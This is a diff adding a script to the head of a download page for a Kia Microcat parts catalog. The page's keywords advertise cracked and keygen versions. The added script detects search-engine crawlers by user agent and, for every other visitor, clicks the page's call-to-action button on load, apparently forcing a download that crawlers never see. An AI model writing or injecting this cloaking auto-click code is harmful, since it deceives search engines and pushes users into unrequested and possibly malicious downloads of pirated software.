@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kia Microcat EPC v6 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Kia Microcat EPC v6 06.2024, the latest electronic parts catalog for KIA with multi-language support. Compatible with Windows 10.">
     <meta name="keywords" content="Kia Microcat EPC v6 06.2024, Kia Microcat EPC v6 07.2024, Microcat Kia epc, microcat epc 2024, Microcat Kia epc download, Microcat Kia epc download free, Kia Microcat EPC multiple languages, Kia Microcat EPC Deutsch, Kia Microcat EPC English, Kia Microcat EPC Espanol, Kia Microcat EPC Francois, Kia Microcat EPC Francais, Kia Microcat EPC Italiano, Kia Microcat EPC Portugues, Kia Microcat EPC Windows 10, Kia Microcat EPC parts catalog, Hyundai Microcat EPC spare parts, Hyundai Microcat EPC accessories, Kia Microcat VIN search, Kia Microcat EPC free download, Microcat Kia epc crack, Microcat Kia epc keygen, Kia Microcat EPC multiple languages free download, Киа Микрокат каталог запчастей, Микрокат Kia epc 2024, Микрокат Kia epc скачать, Микрокат Kia epc скачать бесплатно, Hyundai Microcat каталог, Kia Microcat EPC скачать, Kia Microcat EPC crack, Kia Microcat EPC keygen, Hyundai Microcat каталог запчастей бесплатно, Microcat Kia EPC catalogue free download, Kia Microcat EPC high speed download, Kia Microcat EPC v6 2024 free download, Microcat Kia EPC 2024 free download, Microcat Kia EPC v6 06.2024 windows 10">
     <style>
